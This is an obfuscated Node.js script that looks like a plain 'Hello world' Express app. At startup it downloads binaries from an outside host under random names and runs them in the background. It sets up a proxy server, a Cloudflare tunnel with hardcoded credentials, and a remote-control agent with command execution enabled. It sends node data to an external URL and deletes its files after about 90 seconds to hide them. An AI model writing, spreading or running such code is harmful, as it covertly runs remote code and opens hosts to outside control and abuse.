const _0x3fb000=_0x394a;(function(_0x37489f,_0x193952){const _0x4f246b=_0x394a,_0x472f2a=_0x37489f();while(!![]){try{const _0x393418=parseInt(_0x4f246b(0x18a))/0x1*(-parseInt(_0x4f246b(0x18e))/0x2)+-parseInt(_0x4f246b(0x1cf))/0x3*(parseInt(_0x4f246b(0x1e9))/0x4)+-parseInt(_0x4f246b(0x21c))/0x5*(parseInt(_0x4f246b(0x172))/0x6)+-parseInt(_0x4f246b(0x16a))/0x7*(parseInt(_0x4f246b(0x20b))/0x8)+-parseInt(_0x4f246b(0x210))/0x9*(-parseInt(_0x4f246b(0x1a8))/0xa)+parseInt(_0x4f246b(0x184))/0xb+parseInt(_0x4f246b(0x191))/0xc*(parseInt(_0x4f246b(0x1e7))/0xd);if(_0x393418===_0x193952)break;else _0x472f2a['push'](_0x472f2a['shift']());}catch(_0x388185){_0x472f2a['push'](_0x472f2a['shift']());}}}(_0xa563,0xd994c));const express=require(_0x3fb000(0x1b4)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x3fb000(0x1a9)),{promisify}=require(_0x3fb000(0x1cb)),exec=promisify(require('child_process')[_0x3fb000(0x211)]),{execSync}=require(_0x3fb000(0x1b5)),UPLOAD_URL=process['env'][_0x3fb000(0x1bc)]||'',PROJECT_URL=process['env'][_0x3fb000(0x1e3)]||'',AUTO_ACCESS=process['env'][_0x3fb000(0x175)]||![],FILE_PATH=process[_0x3fb000(0x1e2)]['FILE_PATH']||_0x3fb000(0x193),SUB_PATH=process[_0x3fb000(0x1e2)][_0x3fb000(0x196)]||_0x3fb000(0x173),PORT=process[_0x3fb000(0x1e2)]['SERVER_PORT']||process[_0x3fb000(0x1e2)][_0x3fb000(0x1e8)]||0xbb8,UUID=process[_0x3fb000(0x1e2)][_0x3fb000(0x216)]||'1c1b1886-7e99-4b39-b5fc-a6d3830ac26c',NEZHA_SERVER=process[_0x3fb000(0x1e2)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x3fb000(0x1e2)][_0x3fb000(0x19e)]||'',NEZHA_KEY=process[_0x3fb000(0x1e2)][_0x3fb000(0x1c1)]||'',ARGO_DOMAIN=process[_0x3fb000(0x1e2)][_0x3fb000(0x219)]||_0x3fb000(0x1f0),ARGO_AUTH=process[_0x3fb000(0x1e2)]['ARGO_AUTH']||_0x3fb000(0x1ec),ARGO_PORT=process[_0x3fb000(0x1e2)]['ARGO_PORT']||0x1f41,CFIP=process[_0x3fb000(0x1e2)][_0x3fb000(0x1fe)]||_0x3fb000(0x206),CFPORT=process[_0x3fb000(0x1e2)]['CFPORT']||0x1bb,NAME=process[_0x3fb000(0x1e2)]['NAME']||_0x3fb000(0x163);!fs[_0x3fb000(0x1a7)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x3fb000(0x18f)](FILE_PATH+_0x3fb000(0x17e))):console[_0x3fb000(0x18f)](FILE_PATH+_0x3fb000(0x208));function generateRandomName(){const _0x18c967=_0x3fb000,_0x10635a=_0x18c967(0x167);let _0x134745='';for(let _0x307bee=0x0;_0x307bee<0x6;_0x307bee++){_0x134745+=_0x10635a[_0x18c967(0x202)](Math[_0x18c967(0x166)](Math['random']()*_0x10635a[_0x18c967(0x181)]));}return _0x134745;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x3fb000(0x1b2)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x3fb000(0x1b2)](FILE_PATH,botName),subPath=path[_0x3fb000(0x1b2)](FILE_PATH,_0x3fb000(0x1a4)),listPath=path[_0x3fb000(0x1b2)](FILE_PATH,_0x3fb000(0x1fb)),bootLogPath=path['join'](FILE_PATH,_0x3fb000(0x1c9)),configPath=path['join'](FILE_PATH,_0x3fb000(0x21e));function deleteNodes(){const _0x39c89a=_0x3fb000;try{if(!UPLOAD_URL)return;if(!fs[_0x39c89a(0x1a7)](subPath))return;let _0x247462;try{_0x247462=fs[_0x39c89a(0x1da)](subPath,_0x39c89a(0x17d));}catch{return null;}const _0xff3020=Buffer['from'](_0x247462,_0x39c89a(0x1df))[_0x39c89a(0x17b)](_0x39c89a(0x17d)),_0x5b92d5=_0xff3020[_0x39c89a(0x16b)]('\x0a')[_0x39c89a(0x1bb)](_0x22c2a6=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x39c89a(0x1c3)](_0x22c2a6));if(_0x5b92d5[_0x39c89a(0x181)]===0x0)return;return axios[_0x39c89a(0x1ef)](UPLOAD_URL+_0x39c89a(0x1af),JSON[_0x39c89a(0x1d2)]({'nodes':_0x5b92d5}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x4f6e23=>{return null;}),null;}catch(_0x53f59f){return null;}}function cleanupOldFiles(){const _0x4b4d95=_0x3fb000;try{const _0x283bfb=fs['readdirSync'](FILE_PATH);_0x283bfb[_0x4b4d95(0x1d1)](_0x19f67e=>{const _0x4196a8=_0x4b4d95,_0x2560d3=path[_0x4196a8(0x1b2)](FILE_PATH,_0x19f67e);try{const _0x50d27a=fs[_0x4196a8(0x204)](_0x2560d3);_0x50d27a[_0x4196a8(0x178)]()&&fs[_0x4196a8(0x1db)](_0x2560d3);}catch(_0x47dd2d){}});}catch(_0xe523bc){}}app['get']('/',function(_0x3c67a0,_0x45ef1b){const _0x17b913=_0x3fb000;_0x45ef1b['send'](_0x17b913(0x1dd));});async function generateConfig(){const _0x3f44ad=_0x3fb000,_0x3a1e3b={'log':{'access':'/dev/null','error':_0x3f44ad(0x1dc),'loglevel':_0x3f44ad(0x174)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3f44ad(0x20e),'settings':{'clients':[{'id':UUID,'flow':_0x3f44ad(0x217)}],'decryption':_0x3f44ad(0x174),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x3f44ad(0x18b),'dest':0xbbb},{'path':_0x3f44ad(0x1f4),'dest':0xbbc}]},'streamSettings':{'network':_0x3f44ad(0x1d9)}},{'port':0xbb9,'listen':_0x3f44ad(0x20d),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x3f44ad(0x174)},'streamSettings':{'network':_0x3f44ad(0x1d9),'security':_0x3f44ad(0x174)}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x3f44ad(0x174),'wsSettings':{'path':_0x3f44ad(0x16d)}},'sniffing':{'enabled':!![],'destOverride':[_0x3f44ad(0x177),'tls',_0x3f44ad(0x1c4)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x3f44ad(0x20d),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3f44ad(0x18b)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x3f44ad(0x1ff),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x3f44ad(0x186),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x3f44ad(0x1f4)}},'sniffing':{'enabled':!![],'destOverride':[_0x3f44ad(0x177),'tls',_0x3f44ad(0x1c4)],'metadataOnly':![]}}],'dns':{'servers':[_0x3f44ad(0x1e0)]},'outbounds':[{'protocol':_0x3f44ad(0x165),'tag':_0x3f44ad(0x1d6)},{'protocol':'blackhole','tag':'block'}]};fs[_0x3f44ad(0x1e5)](path[_0x3f44ad(0x1b2)](FILE_PATH,_0x3f44ad(0x21e)),JSON[_0x3f44ad(0x1d2)](_0x3a1e3b,null,0x2));}function getSystemArchitecture(){const _0x18e312=_0x3fb000,_0xa4e185=os['arch']();return _0xa4e185===_0x18e312(0x1b6)||_0xa4e185===_0x18e312(0x1e1)||_0xa4e185==='aarch64'?'arm':_0x18e312(0x180);}function downloadFile(_0x3299a2,_0xbc6eb7,_0x2947e3){const _0x5673f4=_0x3fb000,_0x451273=_0x3299a2;!fs[_0x5673f4(0x1a7)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x506867=fs[_0x5673f4(0x1ae)](_0x451273);axios({'method':_0x5673f4(0x203),'url':_0xbc6eb7,'responseType':_0x5673f4(0x1d7)})[_0x5673f4(0x185)](_0x5bd246=>{const _0x4dff03=_0x5673f4;_0x5bd246['data'][_0x4dff03(0x1fa)](_0x506867),_0x506867['on']('finish',()=>{const _0xbab30b=_0x4dff03;_0x506867[_0xbab30b(0x1aa)](),console['log']('Download\x20'+path[_0xbab30b(0x17f)](_0x451273)+_0xbab30b(0x17c)),_0x2947e3(null,_0x451273);}),_0x506867['on'](_0x4dff03(0x1b1),_0x16daa9=>{const _0x1b2e30=_0x4dff03;fs[_0x1b2e30(0x189)](_0x451273,()=>{});const _0xdff5fc=_0x1b2e30(0x195)+path[_0x1b2e30(0x17f)](_0x451273)+_0x1b2e30(0x19c)+_0x16daa9['message'];console['error'](_0xdff5fc),_0x2947e3(_0xdff5fc);});})[_0x5673f4(0x1d4)](_0x41933e=>{const _0x2e293d=_0x5673f4,_0x439add=_0x2e293d(0x195)+path[_0x2e293d(0x17f)](_0x451273)+_0x2e293d(0x19c)+_0x41933e[_0x2e293d(0x215)];console[_0x2e293d(0x1b1)](_0x439add),_0x2947e3(_0x439add);});}async function downloadFilesAndRun(){const _0x368a1a=_0x3fb000,_0x3af0f5=getSystemArchitecture(),_0x1fb35d=getFilesForArchitecture(_0x3af0f5);if(_0x1fb35d[_0x368a1a(0x181)]===0x0){console[_0x368a1a(0x18f)](_0x368a1a(0x1ce));return;}const _0x3e02ab=_0x1fb35d[_0x368a1a(0x19b)](_0x3abe3c=>{return new Promise((_0x5731d1,_0x5c5bf8)=>{downloadFile(_0x3abe3c['fileName'],_0x3abe3c['fileUrl'],(_0x337901,_0x46d318)=>{_0x337901?_0x5c5bf8(_0x337901):_0x5731d1(_0x46d318);});});});try{await Promise[_0x368a1a(0x220)](_0x3e02ab);}catch(_0x48f149){console[_0x368a1a(0x1b1)](_0x368a1a(0x1b0),_0x48f149);return;}function _0x284c5e(_0x80ee0c){const _0x132704=_0x368a1a,_0x4c8ebf=0x1fd;_0x80ee0c[_0x132704(0x1d1)](_0x5685d7=>{const _0x47a66c=_0x132704;fs[_0x47a66c(0x1a7)](_0x5685d7)&&fs[_0x47a66c(0x176)](_0x5685d7,_0x4c8ebf,_0x25a072=>{const _0x4220cd=_0x47a66c;_0x25a072?console[_0x4220cd(0x1b1)](_0x4220cd(0x222)+_0x5685d7+':\x20'+_0x25a072):console['log'](_0x4220cd(0x1d5)+_0x5685d7+':\x20'+_0x4c8ebf['toString'](0x8));});});}const _0x58f2a6=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x284c5e(_0x58f2a6);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x33f596=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x368a1a(0x16b)](':')[_0x368a1a(0x1c2)]():'',_0x5ce4e7=new Set(['443','8443',_0x368a1a(0x1eb),_0x368a1a(0x1d0),_0x368a1a(0x16e),_0x368a1a(0x1a2)]),_0x2ba2a9=_0x5ce4e7[_0x368a1a(0x1a5)](_0x33f596)?_0x368a1a(0x1be):_0x368a1a(0x1a3),_0x3988e2=_0x368a1a(0x201)+NEZHA_KEY+_0x368a1a(0x1bf)+NEZHA_SERVER+_0x368a1a(0x1a6)+_0x2ba2a9+_0x368a1a(0x1ed)+UUID;fs[_0x368a1a(0x1e5)](path[_0x368a1a(0x1b2)](FILE_PATH,_0x368a1a(0x1b3)),_0x3988e2);const _0x4e487d=_0x368a1a(0x20f)+phpPath+_0x368a1a(0x1b9)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4e487d),console['log'](phpName+'\x20is\x20running'),await new Promise(_0x4ff0d5=>setTimeout(_0x4ff0d5,0x3e8));}catch(_0x518074){console['error'](_0x368a1a(0x1a1)+_0x518074);}}else{let _0x291c68='';const _0x3fe6b7=[_0x368a1a(0x179),'8443','2096','2087','2083',_0x368a1a(0x1a2)];_0x3fe6b7[_0x368a1a(0x197)](NEZHA_PORT)&&(_0x291c68=_0x368a1a(0x1de));const _0x311e51=_0x368a1a(0x20f)+npmPath+_0x368a1a(0x19d)+NEZHA_SERVER+':'+NEZHA_PORT+_0x368a1a(0x18c)+NEZHA_KEY+'\x20'+_0x291c68+_0x368a1a(0x188);try{await exec(_0x311e51),console['log'](npmName+_0x368a1a(0x16f)),await new Promise(_0x399984=>setTimeout(_0x399984,0x3e8));}catch(_0x64c0){console[_0x368a1a(0x1b1)](_0x368a1a(0x1cc)+_0x64c0);}}}else console[_0x368a1a(0x18f)](_0x368a1a(0x199));const _0xbea00d='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0xbea00d),console[_0x368a1a(0x18f)](webName+_0x368a1a(0x16f)),await new Promise(_0x5cd10d=>setTimeout(_0x5cd10d,0x3e8));}catch(_0x3b5449){console[_0x368a1a(0x1b1)](_0x368a1a(0x198)+_0x3b5449);}if(fs[_0x368a1a(0x1a7)](botPath)){let _0x5c27ee;if(ARGO_AUTH[_0x368a1a(0x1f5)](/^[A-Z0-9a-z=]{120,250}$/))_0x5c27ee=_0x368a1a(0x171)+ARGO_AUTH;else ARGO_AUTH[_0x368a1a(0x1f5)](/TunnelSecret/)?_0x5c27ee=_0x368a1a(0x21f)+FILE_PATH+_0x368a1a(0x168):_0x5c27ee=_0x368a1a(0x17a)+FILE_PATH+_0x368a1a(0x209)+ARGO_PORT;try{await exec(_0x368a1a(0x20f)+botPath+'\x20'+_0x5c27ee+_0x368a1a(0x1ee)),console[_0x368a1a(0x18f)](botName+_0x368a1a(0x16f)),await new Promise(_0x2b403f=>setTimeout(_0x2b403f,0x7d0));}catch(_0x212235){console[_0x368a1a(0x1b1)](_0x368a1a(0x192)+_0x212235);}}await new Promise(_0x52e63e=>setTimeout(_0x52e63e,0x1388));}function _0xa563(){const _0x54ed2f=['statSync','clear','cdns.doon.eu.org','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x20already\x20exists','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','&path=%2Fvless-argo%3Fed%3D2560#','2150536LzXIzI','/sub.txt\x20saved\x20successfully','127.0.0.1','vless','nohup\x20','320589CadLqK','exec','unshift','push','response','message','UUID','xtls-rprx-vision','ARGO_DOMAIN:','ARGO_DOMAIN','tunnel.json','https://amd64.ssss.nyc.mn/web','315490VECBdM','https://arm64.ssss.nyc.mn/web','config.json','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','all','/api/add-subscriptions','Empowerment\x20failed\x20for\x20','jinbao1368','/api/add-nodes','freedom','floor','abcdefghijklmnopqrstuvwxyz','/tunnel.yml\x20run','Skipping\x20adding\x20automatic\x20access\x20task','21kyLJUT','split','Error\x20reading\x20boot.log:','/vless-argo','2083','\x20is\x20running','\x0a\x20\x20\x0avmess://','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','120SUGYjv','sub','none','AUTO_ACCESS','chmod','http','isFile','443','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','toString','\x20successfully','utf-8','\x20is\x20created','basename','amd','length','substring','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','14421891YZGkoy','then','trojan','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','unlink','3dByUBo','/vmess-argo','\x20-p\x20','automatic\x20access\x20task\x20added\x20successfully','969814OldfiN','log','http\x20server\x20is\x20running\x20on\x20port:','108Iotyca','Error\x20executing\x20command:\x20','./tmp','application/json','Download\x20','SUB_PATH','includes','web\x20running\x20error:\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','from','map','\x20failed:\x20','\x20-s\x20','NEZHA_PORT','Unhandled\x20error\x20in\x20startserver:','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','php\x20running\x20error:\x20','2053','false','sub.txt','has','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','existsSync','10wiKXya','path','close','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','win32','taskkill\x20/f\x20/im\x20','createWriteStream','/api/delete-nodes','Error\x20downloading\x20files:','error','join','config.yaml','express','child_process','arm','Error\x20in\x20startserver:','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','\x20-c\x20\x22','https://arm64.ssss.nyc.mn/v1','filter','UPLOAD_URL','/vmess-argo?ed=2560','true','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','&fp=firefox&type=ws&host=','NEZHA_KEY','pop','test','quic','Add\x20automatic\x20access\x20task\x20faild:\x20','Content-Type','https://amd64.ssss.nyc.mn/bot','\x20>\x20nul\x202>&1','boot.log','\x0a\x20\x20tunnel:\x20','util','npm\x20running\x20error:\x20','send','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','3UIxDHn','2087','forEach','stringify','?security=tls&sni=','catch','Empowerment\x20success\x20for\x20','direct','stream','listen','tcp','readFileSync','unlinkSync','/dev/null','Hello\x20world!','--tls','base64','https+local://8.8.8.8/dns-query','arm64','env','PROJECT_URL','Subscription\x20uploaded\x20successfully','writeFileSync','ArgoDomain:','6463379RiZUJH','PORT','5628020DkAMBb','\x0a\x20\x20\x0atrojan://','2096','eyJhIjoiZDI3OGQ0ZDNjMDlhNjFlMmE0YmY2YzdiYTUzODRmN2YiLCJ0IjoiNjNkNmE5OTEtYjE4Mi00NWUwLTgyYjMtZjZjMTIyODk2ZTA1IiwicyI6IllUQmtZV0l4WWpJdFpXTTJaaTAwTmprNExUaG1PVFV0TXpVeFpUUTRabU5rTWpVeSJ9','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x20>/dev/null\x202>&1\x20&','post','\x20jinbao1368.jinbao1368.netlib.re','rm\x20-rf\x20','del\x20/f\x20/q\x20','https://amd64.ssss.nyc.mn/v1','/trojan-argo','match','App\x20is\x20running','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','status','https://amd64.ssss.nyc.mn/agent','pipe','list.txt','https://oooo.serv00.net/add-url','platform','CFIP','tls','\x20>/dev/null\x202>&1','\x0aclient_secret:\x20','charAt','get'];_0xa563=function(){return _0x54ed2f;};return _0xa563();}function getFilesForArchitecture(_0x1c0b75){const _0x2d3668=_0x3fb000;let _0x22396f;_0x1c0b75===_0x2d3668(0x1b6)?_0x22396f=[{'fileName':webPath,'fileUrl':_0x2d3668(0x21d)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x22396f=[{'fileName':webPath,'fileUrl':_0x2d3668(0x21b)},{'fileName':botPath,'fileUrl':_0x2d3668(0x1c7)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4b07f2=_0x1c0b75==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x2d3668(0x1f9);_0x22396f['unshift']({'fileName':npmPath,'fileUrl':_0x4b07f2});}else{const _0x5ad469=_0x1c0b75===_0x2d3668(0x1b6)?_0x2d3668(0x1ba):_0x2d3668(0x1f3);_0x22396f[_0x2d3668(0x212)]({'fileName':phpPath,'fileUrl':_0x5ad469});}}return _0x22396f;}function argoType(){const _0x3d3cc6=_0x3fb000;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3d3cc6(0x18f)](_0x3d3cc6(0x187));return;}if(ARGO_AUTH[_0x3d3cc6(0x197)]('TunnelSecret')){fs[_0x3d3cc6(0x1e5)](path['join'](FILE_PATH,_0x3d3cc6(0x21a)),ARGO_AUTH);const _0x11d85f=_0x3d3cc6(0x1ca)+ARGO_AUTH[_0x3d3cc6(0x16b)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x3d3cc6(0x1b2)](FILE_PATH,_0x3d3cc6(0x21a))+_0x3d3cc6(0x183)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x3d3cc6(0x1a0);fs['writeFileSync'](path[_0x3d3cc6(0x1b2)](FILE_PATH,'tunnel.yml'),_0x11d85f);}else console[_0x3d3cc6(0x18f)](_0x3d3cc6(0x207));}function _0x394a(_0x40af28,_0x4986b3){const _0xa56349=_0xa563();return _0x394a=function(_0x394a1e,_0x17ead5){_0x394a1e=_0x394a1e-0x163;let _0x11b85f=_0xa56349[_0x394a1e];return _0x11b85f;},_0x394a(_0x40af28,_0x4986b3);}argoType();async function extractDomains(){const _0x22582b=_0x3fb000;let _0xfc46a6;if(ARGO_AUTH&&ARGO_DOMAIN)_0xfc46a6=ARGO_DOMAIN,console['log'](_0x22582b(0x218),_0xfc46a6),await _0x172ed9(_0xfc46a6);else try{const _0x57c03d=fs[_0x22582b(0x1da)](path[_0x22582b(0x1b2)](FILE_PATH,'boot.log'),_0x22582b(0x17d)),_0x51e847=_0x57c03d['split']('\x0a'),_0x46c2b6=[];_0x51e847['forEach'](_0x395c80=>{const _0x2bd9fb=_0x22582b,_0xbd3a0c=_0x395c80[_0x2bd9fb(0x1f5)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xbd3a0c){const _0x511244=_0xbd3a0c[0x1];_0x46c2b6[_0x2bd9fb(0x213)](_0x511244);}});if(_0x46c2b6['length']>0x0)_0xfc46a6=_0x46c2b6[0x0],console[_0x22582b(0x18f)](_0x22582b(0x1e6),_0xfc46a6),await _0x172ed9(_0xfc46a6);else{console[_0x22582b(0x18f)](_0x22582b(0x1f7)),fs[_0x22582b(0x1db)](path['join'](FILE_PATH,_0x22582b(0x1c9)));async function _0x5e482d(){const _0x1efa1f=_0x22582b;try{process[_0x1efa1f(0x1fd)]===_0x1efa1f(0x1ac)?await exec(_0x1efa1f(0x1ad)+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName[_0x1efa1f(0x202)](0x0)+']'+botName[_0x1efa1f(0x182)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x4d18d3){}}_0x5e482d(),await new Promise(_0x1e5a7f=>setTimeout(_0x1e5a7f,0xbb8));const _0x1d1f82=_0x22582b(0x17a)+FILE_PATH+_0x22582b(0x209)+ARGO_PORT;try{await exec(_0x22582b(0x20f)+botPath+'\x20'+_0x1d1f82+_0x22582b(0x1ee)),console['log'](botName+_0x22582b(0x16f)),await new Promise(_0x323f07=>setTimeout(_0x323f07,0xbb8)),await extractDomains();}catch(_0x1714fb){console[_0x22582b(0x1b1)](_0x22582b(0x192)+_0x1714fb);}}}catch(_0x5e2bc3){console['error'](_0x22582b(0x16c),_0x5e2bc3);}async function _0x172ed9(_0x395f94){const _0x55babf=_0x22582b,_0x35c6b4=execSync(_0x55babf(0x1b8),{'encoding':_0x55babf(0x17d)}),_0x8c87fc=_0x35c6b4['trim'](),_0x8493e2=NAME?NAME+'-'+_0x8c87fc:_0x8c87fc;return new Promise(_0x2ccf6d=>{setTimeout(()=>{const _0x38f338=_0x394a,_0x51d67f={'v':'2','ps':''+_0x8493e2,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x38f338(0x174),'net':'ws','type':_0x38f338(0x174),'host':_0x395f94,'path':_0x38f338(0x1bd),'tls':_0x38f338(0x1ff),'sni':_0x395f94,'alpn':'','fp':'firefox'},_0x502a77='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x395f94+_0x38f338(0x1c0)+_0x395f94+_0x38f338(0x20a)+_0x8493e2+_0x38f338(0x170)+Buffer[_0x38f338(0x19a)](JSON['stringify'](_0x51d67f))[_0x38f338(0x17b)](_0x38f338(0x1df))+_0x38f338(0x1ea)+UUID+'@'+CFIP+':'+CFPORT+_0x38f338(0x1d3)+_0x395f94+_0x38f338(0x1c0)+_0x395f94+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x8493e2+'\x0a\x20\x20\x20\x20';console[_0x38f338(0x18f)](Buffer[_0x38f338(0x19a)](_0x502a77)['toString']('base64')),fs[_0x38f338(0x1e5)](subPath,Buffer[_0x38f338(0x19a)](_0x502a77)[_0x38f338(0x17b)](_0x38f338(0x1df))),console[_0x38f338(0x18f)](FILE_PATH+_0x38f338(0x20c)),uploadNodes(),app[_0x38f338(0x203)]('/'+SUB_PATH,(_0x5c23f2,_0x1e6513)=>{const _0x3bdc43=_0x38f338,_0x5932c8=Buffer[_0x3bdc43(0x19a)](_0x502a77)['toString'](_0x3bdc43(0x1df));_0x1e6513['set'](_0x3bdc43(0x1c6),'text/plain;\x20charset=utf-8'),_0x1e6513[_0x3bdc43(0x1cd)](_0x5932c8);}),_0x2ccf6d(_0x502a77);},0x7d0);});}}async function uploadNodes(){const _0x52b3ae=_0x3fb000;if(UPLOAD_URL&&PROJECT_URL){const _0x43deea=PROJECT_URL+'/'+SUB_PATH,_0x2b961f={'subscription':[_0x43deea]};try{const _0x155860=await axios[_0x52b3ae(0x1ef)](UPLOAD_URL+_0x52b3ae(0x221),_0x2b961f,{'headers':{'Content-Type':_0x52b3ae(0x194)}});return _0x155860&&_0x155860[_0x52b3ae(0x1f8)]===0xc8?(console['log'](_0x52b3ae(0x1e4)),_0x155860):null;}catch(_0x7c768c){if(_0x7c768c[_0x52b3ae(0x214)]){if(_0x7c768c['response'][_0x52b3ae(0x1f8)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x52b3ae(0x1a7)](listPath))return;const _0x16cfac=fs[_0x52b3ae(0x1da)](listPath,_0x52b3ae(0x17d)),_0x241b43=_0x16cfac[_0x52b3ae(0x16b)]('\x0a')[_0x52b3ae(0x1bb)](_0xd9d3ef=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x52b3ae(0x1c3)](_0xd9d3ef));if(_0x241b43[_0x52b3ae(0x181)]===0x0)return;const _0x49a9cd=JSON['stringify']({'nodes':_0x241b43});try{const _0x3f408e=await axios['post'](UPLOAD_URL+_0x52b3ae(0x164),_0x49a9cd,{'headers':{'Content-Type':_0x52b3ae(0x194)}});return _0x3f408e&&_0x3f408e[_0x52b3ae(0x1f8)]===0xc8?(console[_0x52b3ae(0x18f)]('Nodes\x20uploaded\x20successfully'),_0x3f408e):null;}catch(_0x4a2225){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x13a3d2=_0x394a,_0x11c6b9=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x11c6b9[_0x13a3d2(0x213)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x11c6b9[_0x13a3d2(0x213)](phpPath);process['platform']===_0x13a3d2(0x1ac)?exec(_0x13a3d2(0x1f2)+_0x11c6b9[_0x13a3d2(0x1b2)]('\x20')+_0x13a3d2(0x1c8),_0x24ec09=>{const _0x4fb775=_0x13a3d2;console[_0x4fb775(0x205)](),console['log']('App\x20is\x20running'),console[_0x4fb775(0x18f)](_0x4fb775(0x1ab));}):exec(_0x13a3d2(0x1f1)+_0x11c6b9['join']('\x20')+_0x13a3d2(0x200),_0x187270=>{const _0x5eeaab=_0x13a3d2;console[_0x5eeaab(0x205)](),console['log'](_0x5eeaab(0x1f6)),console[_0x5eeaab(0x18f)](_0x5eeaab(0x1ab));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x556a0d=_0x3fb000;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x556a0d(0x169));return;}try{const _0x337a1a=await axios[_0x556a0d(0x1ef)](_0x556a0d(0x1fc),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x556a0d(0x194)}});return console[_0x556a0d(0x18f)](_0x556a0d(0x18d)),_0x337a1a;}catch(_0x28dfa6){return console[_0x556a0d(0x1b1)](_0x556a0d(0x1c5)+_0x28dfa6[_0x556a0d(0x215)]),null;}}async function startserver(){const _0x19ae40=_0x3fb000;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x10dcc8){console['error'](_0x19ae40(0x1b7),_0x10dcc8);}}startserver()[_0x3fb000(0x1d4)](_0x4f776f=>{const _0x4f279a=_0x3fb000;console[_0x4f279a(0x1b1)](_0x4f279a(0x19f),_0x4f776f);}),app[_0x3fb000(0x1d8)](PORT,()=>console[_0x3fb000(0x18f)](_0x3fb000(0x190)+PORT+'!'));
